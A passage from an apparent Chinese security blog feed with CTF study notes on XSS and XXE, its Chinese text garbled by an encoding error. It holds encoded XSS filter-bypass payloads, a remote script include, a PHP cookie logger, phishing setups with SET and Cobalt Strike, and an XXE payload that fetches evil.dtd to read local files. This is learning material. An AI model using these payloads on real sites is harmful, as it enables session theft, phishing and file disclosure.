class="string">&quot;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74:\u0061\u006c\u0065\u0072\u0074(/XSS/)&quot;</span>&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­å¯¹JavaScriptè¿›è¡Œäº†<a class="link"   href="https://www.qqxiuzi.cn/bianma/zifushiti.php" >htmlå®ä½“ç¼–ç  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>å¯¹alertè¿›è¡Œäº†<a class="link"   href="https://www.bejson.com/convert/unicode_chinese/" >Unicodeç¼–ç  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œè¿™æ ·ä¸€æ¥åœ¨ä¿è¯ä»£ç èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œçš„å‰æä¸‹ï¼Œè¿˜å¯ä»¥ç»•è¿‡ä¸€äº›é˜²æŠ¤</p><h3 id="2ï¼‰äºŒå±‚æ··æ·†"><a href="#2ï¼‰äºŒå±‚æ··æ·†" class="headerlink" title="2ï¼‰äºŒå±‚æ··æ·†"></a>2ï¼‰äºŒå±‚æ··æ·†</h3><p>äºŒå±‚æ··æ·†å°±æ˜¯å¯¹XSSä»£ç åœ¨éµå¾ªæµè§ˆå™¨è§£ç è§„åˆ™çš„æƒ…å†µä¸‹è¿›è¡Œä¸¤æ¬¡ç¼–ç ï¼Œè®©é˜²æŠ¤è½¯ä»¶æ— æ³•ç†è§£XSSä»£ç ï¼Œè¿›è€Œç»•è¿‡é˜²æŠ¤è½¯ä»¶ã€‚</p><ul><li>javascriptï¼ˆæœ€åï¼‰ &lt; unicodeï¼ˆå…¶æ¬¡ï¼‰ &lt; htmlï¼ˆæœ€å…ˆè¢«è§£ç ï¼‰</li></ul><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(/XSS/)&quot;</span>&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></div><p>ä¸Šé¢çš„alertç»è¿‡äº†åŒé‡ç¼–ç ï¼Œå…ˆæ˜¯Unicodeç¼–ç ï¼Œç„¶ååˆç»è¿‡Urlç¼–ç ï¼ˆæ‰€æœ‰å­—ç¬¦éƒ½è¦ç¼–ç ï¼‰ï¼Œè¿™é‡Œæä¾›ä¸€ä¸ªç½‘ç«™<a class="link"   href="http://web.chacuo.net/charseturlencode/" >åœ¨çº¿urlencodeç¼–ç ã€urldecodeè§£ç ã€urlç¼–ç è§£ç ã€ç™¾åˆ†å·ç¼–ç  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼ŒJavaScriptä¾æ—§æ˜¯htmlå®ä½“ç¼–ç </p><h3 id="3ï¼‰ä¸‰å±‚æ··æ·†"><a href="#3ï¼‰ä¸‰å±‚æ··æ·†" class="headerlink" title="3ï¼‰ä¸‰å±‚æ··æ·†"></a>3ï¼‰ä¸‰å±‚æ··æ·†</h3><p>ä¸‰å±‚æ··æ·†å°±æ˜¯åœ¨äºŒå±‚æ··æ·†çš„åŸºç¡€ä¸Šå†å¢åŠ ä¸€æ¬¡ç¼–ç ï¼Œè®©é˜²æŠ¤è½¯ä»¶æ— æ³•ç†è§£ï¼Œå‰æè¿˜æ˜¯è¦éµå¾ªæµè§ˆå™¨çš„è§£æè§„åˆ™ï¼Œä½¿ä»£ç èƒ½å¤Ÿè¢«æµè§ˆå™¨ç†è§£ï¼ï¼ï¼</p><p>è¿˜æ˜¯ä»¥ä¸Šé¢é‚£ä¸ªä¸ºä¾‹ï¼Œåªè¦å°†alertå†è¿›è¡Œä¸€æ¬¡htmlå®ä½“ç¼–ç å³å¯</p><h2 id="å®æˆ˜XSSæ€è·¯"><a href="#å®æˆ˜XSSæ€è·¯" class="headerlink" title="å®æˆ˜XSSæ€è·¯"></a>å®æˆ˜XSSæ€è·¯</h2><p><a class="link"   href="https://www.sqlsec.com/2020/10/xss2.html" >https://www.sqlsec.com/2020/10/xss2.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="ç›²æ‰“"><a href="#ç›²æ‰“" class="headerlink" title="ç›²æ‰“"></a>ç›²æ‰“</h3><p>è¾“å…¥å¤„ç›´æ¥æ‹¼æ¥jsä»£ç ï¼Œè®¿é—®è‡ªå·±æœåŠ¡å™¨ä¸Šçš„jsæ–‡ä»¶</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://10.20.24.244/xss/myjs/x.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p>ä¹Ÿå¯ä»¥å»æ‰åŒå¼•å·</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="attr">http</span>:<span class="comment">//10.20.24.244/xss/myjs/x.js&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å½“å¯¹æ–¹æŸ¥çœ‹æˆ‘ä»¬è¾“å…¥è¡¨å•å†…å®¹æ—¶(ä¸€èˆ¬æ˜¯ååœ¨æŸ¥çœ‹)ï¼Œå¯ä»¥åˆ©ç”¨jsä»£ç è·å–å…¶cookieä»¥åŠåå°urlï¼Œè¿™æ ·å°±å¯ä»¥ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure></div><p>ä¹Ÿå¯ä»¥åœ¨æœåŠ¡åŒºä¸Šå†™ä¸ªphp</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span> (<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&quot;IP: &quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot;Date: &quot;</span>.<span class="variable">$time</span>.<span class="string">&quot; Cookie:&quot;</span>.<span class="variable">$cookie</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span>   </span><br></pre></td></tr></table></figure></div></blockquote><h3 id="SETé’“é±¼"><a href="#SETé’“é±¼" class="headerlink" title="SETé’“é±¼"></a>SETé’“é±¼</h3><p>setå·¥å…·ç”Ÿæˆä¸åå°é¡µé¢ç›¸åŒç½‘é¡µï¼Œè¯±å¯¼ç®¡ç†å‘˜ç‚¹å‡»</p><p>å¯ä»¥ç›´æ¥ç”¨XSSçš„é“¾æ¥è·³è½¬</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://10.20.25.39/&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>macç»ˆç«¯ä½¿ç”¨setoolkitï¼Œè¿è¡Œ</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">social-engineer-toolkit  </span><br><span class="line">sudo setoolkit</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="Flashé’“é±¼"><a href="#Flashé’“é±¼" class="headerlink" title="Flashé’“é±¼"></a>Flashé’“é±¼</h3><p>æ¨¡ä»¿çš„ Flash Player ä¸­æ–‡å®˜ç½‘çš„é¡µé¢</p><p><a href="https://image.3001.net/images/20201029/16039798083018.png"><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q3ghe79bj31dv0u0jub.jpg"                      alt="img"                ><figcaption>img</figcaption></figure></a></p><blockquote><p>ç‚¹å‡»ä¼šä¸‹è½½å‡†å¤‡å¥½çš„CSé©¬</p></blockquote><h3 id="CSé’“é±¼"><a href="#CSé’“é±¼" class="headerlink" title="CSé’“é±¼"></a>CSé’“é±¼</h3><p> Cobalt Strike ä¹Ÿæ˜¯å¯ä»¥è½»æ¾æ„å»ºå‡ºä¸€ä¸ªé’“é±¼ç½‘ç«™çš„ï¼Œæ“ä½œä¹Ÿæ¯”è¾ƒç®€å•ï¼š</p><p>ã€Œæ”»å‡»ã€-ã€Œé’“é±¼æ”»å‡»ã€-ã€Œå…‹éš†ç½‘ç«™ã€ï¼š</p><p><a href="https://image.3001.net/images/20201031/1604132838976.png"><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1h6q3lqohldj30ey0c6gmj.jpg"                      alt="img"                ><figcaption>img</figcaption></figure></a></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q3m2lj0dj311e0u0wi8.jpg"                      alt="image-20221001211618566"                ><figcaption>image-20221001211618566</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXEå­¦ä¹ </title>
      <link href="/2022/04/22/XXE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/22/XXE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXEå…¨ç§°XML External Entity InjectionXMLåœ¨å¼•å…¥å¤–éƒ¨å®ä½“çš„æ—¶å€™å®Œæˆæ³¨å…¥æ”»å‡»ç§°ä¸ºXXEã€‚</p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="XMLè¯­è¨€"><a href="#XMLè¯­è¨€" class="headerlink" title="XMLè¯­è¨€"></a>XMLè¯­è¨€</h3><p>XMLæ˜¯ä¸€ç§ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®çš„å¯æ‰©å±•æ ‡è®°è¯­è¨€ã€‚</p><p>XMLç”¨äº<strong>ä¼ è¾“å’Œæ•°æ®å­˜å‚¨</strong>ã€‚HTMLç”¨äºæ˜¾ç¤ºæ•°æ®</p><p>è¯­æ³•è§„åˆ™</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.æ‰€æœ‰çš„XMLå…ƒç´ éƒ½å¿…é¡»æœ‰ä¸€ä¸ªå…³é—­æ ‡ç­¾  e.g. &lt;note&gt; &lt;/note&gt;</span><br><span class="line">2.XMLæ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ</span><br><span class="line">3.XMLå¿…é¡»æ­£ç¡®åµŒå¥—</span><br><span class="line">4.XMLå±æ€§å€¼å¿…é¡»åŠ å¼•å·&quot;&quot;</span><br><span class="line">5.å®ä½“å¼•ç”¨ï¼šåœ¨æ ‡ç­¾å±æ€§ï¼Œæˆ–è€…å¯¹åº”ä½ç½®å€¼å¯èƒ½å‡ºç°&lt;&gt;ç¬¦å·ï¼Œè¿™äº›åœ¨å¯¹åº”çš„xmlä¸­éƒ½æ˜¯ç‰¹æ®Šå«ä¹‰çš„ï¼Œé‚£ä¹ˆå¿…é¡»ä½¿ç”¨å¯¹åº”htmlçš„å®ä½“å¯¹åº”çš„è¡¨ç¤º:ä¾‹å¦‚ï¼Œ&lt;message&gt;if salary &lt; 1000 then &lt;/message&gt;å¦‚æœæŠŠè¿™ä¸ªâ€œ&lt;â€æ”¾åœ¨å…ƒç´ ä¸­ï¼Œé‚£ä¹ˆè§£æå™¨ä¼šæŠŠä»–å½“æˆæ–°å…ƒç´ çš„å¼€å§‹ï¼Œå°±ä¼šå‘ç”ŸæŠ¥é”™ã€‚ä¸ºäº†é¿å…è¿™ä¸ªé”™è¯¯ä½¿ç”¨å®ä½“å¼•ç”¨æ¥ä»£æ›¿&lt;message&gt;if salary &amp;lt; 1000 then &lt;/message&gt;</span><br></pre></td></tr></table></figure></div><p><strong>xmlç»“æ„</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XML æ–‡æ¡£å£°æ˜ï¼Œåœ¨æ–‡æ¡£çš„ç¬¬ä¸€è¡Œ</span><br><span class="line">XML æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œå³DTDï¼ŒXXE æ¼æ´æ‰€åœ¨çš„åœ°æ–¹</span><br><span class="line">XML æ–‡æ¡£å…ƒç´ </span><br></pre></td></tr></table></figure></div><blockquote><p>æ ¹æ® DOMï¼ŒXML æ–‡æ¡£ä¸­çš„æ¯ä¸ªæˆåˆ†éƒ½æ˜¯ä¸€ä¸ª<strong>èŠ‚ç‚¹</strong>ã€‚</p><p>DOM æ˜¯è¿™æ ·è§„å®šçš„ï¼š</p><ul><li>æ•´ä¸ªæ–‡æ¡£æ˜¯ä¸€ä¸ªæ–‡æ¡£èŠ‚ç‚¹</li><li>æ¯ä¸ª XML æ ‡ç­¾æ˜¯ä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹</li><li>åŒ…å«åœ¨ XML å…ƒç´ ä¸­çš„æ–‡æœ¬æ˜¯æ–‡æœ¬èŠ‚ç‚¹</li><li>æ¯ä¸€ä¸ª XML å±æ€§æ˜¯ä¸€ä¸ªå±æ€§èŠ‚ç‚¹</li><li>æ³¨é‡Šå±äºæ³¨é‡ŠèŠ‚ç‚¹</li></ul><p><u>*<year>2005</year>*ï¼Œå…ƒç´ èŠ‚ç‚¹ <year>ï¼Œæ‹¥æœ‰ä¸€ä¸ªå€¼ä¸º â€œ2005â€ çš„æ–‡æœ¬èŠ‚ç‚¹ã€‚â€2005â€ <em>ä¸æ˜¯</em> <year> å…ƒç´ çš„å€¼ï¼</u></p></blockquote><h3 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a><strong>XML DTD</strong></h3><p>1ã€æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚</p><p>2ã€DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ª<strong>å¤–éƒ¨å¼•ç”¨</strong>ã€‚</p><blockquote><p> ç¬¬äºŒæ¡æ˜¯é‡ç‚¹ï¼Œä¹Ÿæ˜¯XXEæ¼æ´äº§ç”Ÿçš„åŸå› ï¼ŒDTDå¯ä»¥<strong>å®šä¹‰å¤–éƒ¨å®ä½“å¹¶å¼•ç”¨</strong></p></blockquote><p><strong>å†…éƒ¨å£°æ˜DTD</strong></p><p>è‹¥DTDè¦åœ¨XMLæ–‡æ¡£ä¸­ä½¿ç”¨ï¼Œä»–éœ€è¦åŒ…å«åœ¨Â·DOCTYPEå£°æ˜ä¸­</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--xmlå£°æ˜--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">playwin</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;playwin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resume</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span> <span class="symbol">&amp;name;</span> <span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resume</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><ul><li>DOCTYPEå£°æ˜è¯­æ³• <code>&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</code></li><li>å®ä½“å¼•ç”¨ï¼š<code>&lt;!ENTITY å®ä½“å &quot;å®ä½“å€¼&quot;&gt;</code></li><li>ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ: ä¸€ä¸ªå’Œå· (&amp;), ä¸€ä¸ªå®ä½“åç§°, ä»¥åŠä¸€ä¸ªåˆ†å· ( ; )ã€‚</li><li>å£°æ˜ name çš„å€¼ä¸º playwin ï¼Œä¸‹é¢å¼•ç”¨ &amp;nameï¼›xmlä¼šè‡ªåŠ¨è§£æä¸ºä»–çš„å€¼ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå¦åˆ™æŠ¥é”™</li></ul></blockquote><p><strong>å¤–éƒ¨å£°æ˜DTD</strong></p><p>å£°æ˜å¤–éƒ¨å®ä½“(å¤–éƒ¨å®ä½“ä¸æ˜¯xmlæœ¬èº«å·²å®šä¹‰çš„å®ä½“)</p><p>è¯­æ³•</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY å®ä½“åå­— <span class="keyword">SYSTEM</span> <span class="string">&quot;URL&quot;</span>&gt;</span>  <span class="comment">&lt;!--å¯ä»¥ä½¿ç”¨åè®®è¯»å–å¤–éƒ¨æ•°æ®--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY å®ä½“åå­— <span class="keyword">PUBLIC</span> <span class="string">&quot;public_ID&quot;</span> <span class="string">&quot;URL&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///Users/sloth/1.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>æ¡ˆä¾‹</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">name</span>)&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">hack3r</span> <span class="string">&quot;http://www.chenguanxin.com&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;hack3r;<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><ul><li>å¤–éƒ¨å£°æ˜å®ä½“å¤–éƒ¨å®ä½“ç”¨æ¥å¼•ç”¨å¤–éƒ¨èµ„æº,æœ‰ä¸¤ä¸ªå…³é”®å­—<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ä¸¤ä¸ª,è¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœº</li><li>æ ¹æ®ä¸åŒç¯å¢ƒä¸åŒåè®®è¯»å–å¤–éƒ¨æ•°æ®</li><li><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040003178.jpg"                      alt="sÃŸ"                ><figcaption>sÃŸ</figcaption></figure></li></ul></blockquote><p><strong>å®ä½“çš„åµŒå¥—</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %å®ä½“åç§° &quot;å€¼&quot;&gt; &lt;!--å†…éƒ¨--&gt;</span><br><span class="line">&lt;!ENTITY %å®ä½“åç§° SYSTEM &quot;URL&quot;&gt; &lt;!--å¤–éƒ¨--&gt;</span><br></pre></td></tr></table></figure></div><p>å®ä¾‹:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;</span><br><span class="line">%xxe;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;evil;&lt;/foo&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>DOCTYPEå‰è¦ç´§è·Ÿ!</p></blockquote><p>è€Œé‡Œé¢å¼•ç”¨çš„å¤–éƒ¨å®ä½“evil.dtdçš„å†…å®¹:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY evil SYSTEM &quot;file://æ–‡ä»¶è·¯å¾„&quot; &gt;</span><br></pre></td></tr></table></figure></div><h2 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h2><p>å‰æï¼š</p><p>Content-Type: application&#x2F;xml</p><h3 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h3><p><code>file_get_contents()</code>:æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p><p><code>libxml_disable_entity_loader(false)</code>ï¼šæ„æ€å°±æ˜¯ä¸ç¦æ­¢å¤–éƒ¨å®ä½“åŠ è½½</p><p><code>loadXML( string $source, int $options = 0 )</code>: $sourceï¼šæ­¤å‚æ•°ä¿å­˜åŒ…å« XML æ–‡æ¡£çš„å­—ç¬¦ä¸²ã€‚$optionsï¼šæ­¤å‚æ•°ä¿å­˜ libxml é€‰é¡¹å¸¸é‡çš„æŒ‰ä½æˆ–ã€‚è¿”å›å€¼ï¼šæ­¤å‡½æ•°åœ¨æˆåŠŸæ—¶è¿”å› TRUEï¼Œåœ¨å¤±è´¥æ—¶è¿”å› FALSEã€‚å¦‚æœé™æ€è°ƒç”¨æ­¤å‡½æ•°ï¼Œåˆ™è¿”å› DOMDocumentï¼Œå¤±è´¥æ—¶è¿”å› FALSEã€‚</p><blockquote><p>LIBXML_NOENT: å°† XML ä¸­çš„å®ä½“å¼•ç”¨ æ›¿æ¢ æˆå¯¹åº”çš„å€¼</p><p>LIBXML_DTDLOAD: åŠ è½½ DOCTYPE ä¸­çš„ DTD æ–‡ä»¶</p><h3 id="libxmlé€‰é¡¹å¸¸é‡"><a href="#libxmlé€‰é¡¹å¸¸é‡" class="headerlink" title="libxmlé€‰é¡¹å¸¸é‡"></a>libxmlé€‰é¡¹å¸¸é‡</h3><table><thead><tr><th>åç§°</th><th>æè¿°</th><th>PHP</th></tr></thead><tbody><tr><td>LIBXML_COMPACT</td><td>è®¾ç½®å°å‹èŠ‚ç‚¹åˆ†é…ä¼˜åŒ–ã€‚ä¼šæ”¹å–„åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚</td><td>5</td></tr><tr><td>LIBXML_DTDATTR</td><td>è®¾ç½®é»˜è®¤ DTD å±æ€§ã€‚</td><td>5</td></tr><tr><td>LIBXML_DTDLOAD</td><td>åŠ è½½å¤–éƒ¨å­é›†ã€‚</td><td>5</td></tr><tr><td>LIBXML_DTDVALID</td><td>é€šè¿‡ DTD è¿›è¡ŒéªŒè¯ã€‚</td><td>5</td></tr><tr><td>LIBXML_NOBLANKS</td><td>åˆ é™¤ç©ºèŠ‚ç‚¹ã€‚</td><td>5</td></tr><tr><td>LIBXML_NOCDATA</td><td>æŠŠ CDATA è®¾ç½®ä¸ºæ–‡æœ¬èŠ‚ç‚¹ã€‚</td><td>5</td></tr><tr><td>LIBXML_NOEMPTYTAG</td><td>æ›´æ”¹ç©ºæ ‡ç­¾ï¼ˆæ¯”å¦‚ <br/> æ”¹ä¸º <br></br>ï¼‰ã€‚ä»…åœ¨ DOMDocument-&gt;save() å’Œ DOMDocument-&gt;saveXML() å‡½æ•°ä¸­å¯ç”¨ã€‚</td><td>5</td></tr><tr><td>LIBXML_NOENT</td><td>æ›¿ä»£å®ä½“ã€‚</td><td>5</td></tr><tr><td>LIBXML_NOERROR</td><td>ä¸æ˜¾ç¤ºé”™è¯¯æŠ¥å‘Šã€‚</td><td>5</td></tr><tr><td>LIBXML_NONET</td><td>åœ¨åŠ è½½æ–‡æ¡£æ—¶åœæ­¢ç½‘ç»œè®¿é—®ã€‚</td><td>5</td></tr><tr><td>LIBXML_NOWARNING</td><td>ä¸æ˜¾ç¤ºè­¦å‘ŠæŠ¥å‘Šã€‚</td><td>5</td></tr><tr><td>LIBXML_NOXMLDECL</td><td>åœ¨ä¿å­˜æ–‡æ¡£æ—¶ï¼Œæ’¤é”€ XML å£°æ˜ã€‚</td><td>5</td></tr><tr><td>LIBXML_NSCLEAN</td><td>åˆ é™¤é¢å¤–çš„å‘½åç©ºé—´å£°æ˜ã€‚</td><td>5</td></tr><tr><td>LIBXML_XINCLUDE</td><td>ä½¿ç”¨ XInclude ç½®æ¢ã€‚</td><td>5</td></tr><tr><td>LIBXML_ERR_ERROR</td><td>è·å¾—å¯æ¢å¤çš„é”™è¯¯ã€‚</td><td>5</td></tr><tr><td>LIBXML_ERR_FATAL</td><td>è·å¾—è‡´å‘½çš„é”™è¯¯ã€‚</td><td>5</td></tr><tr><td>LIBXML_ERR_NONE</td><td>è·å¾—æ— é”™è¯¯ã€‚</td><td>5</td></tr><tr><td>LIBXML_ERR_WARNING</td><td>è·å¾—ç®€å•è­¦å‘Šã€‚</td><td>5</td></tr><tr><td>LIBXML_VERSION</td><td>è·å¾— Libxml ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ï¼š20605 æˆ– 20617ï¼‰Get libxml version (e.g. 20605 or 20617)</td><td>5</td></tr><tr><td>LIBXML_DOTTED_VERSION</td><td>è·å¾—æœ‰ç‚¹å·çš„ Libxml ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ï¼š2.6.5 æˆ– 2.6.17ï¼‰ã€‚</td><td>5</td></tr></tbody></table></blockquote><h3 id="åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶"><a href="#åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶" class="headerlink" 